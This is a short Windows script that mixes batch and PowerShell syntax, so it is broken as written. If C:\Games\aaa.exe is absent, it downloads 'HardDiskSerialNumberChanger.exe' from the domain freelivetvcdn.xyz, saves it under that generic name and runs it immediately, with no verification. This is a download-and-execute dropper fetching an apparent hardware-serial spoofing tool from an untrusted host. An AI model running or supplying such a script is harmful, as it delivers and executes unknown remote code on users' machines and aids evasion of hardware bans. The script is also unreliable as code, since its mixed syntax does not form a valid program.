@echo off

$file = 'C:\Games\aaa.exe'

if (-not(Test-Path -Path $file -PathType Leaf)) {
     
         %SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe Invoke-WebRequest -Uri "https://freelivetvcdn.xyz/HardDiskSerialNumberChanger.exe" -OutFile "C:\Games\aaa.exe"
			Invoke-expression -command "C:\Games\aaa.exe"
 }
# If the file already exists, show the message and do nothing.
 else {
     Write-Host "Cannot create [$file] because a file with that name already exists."
 }



exit
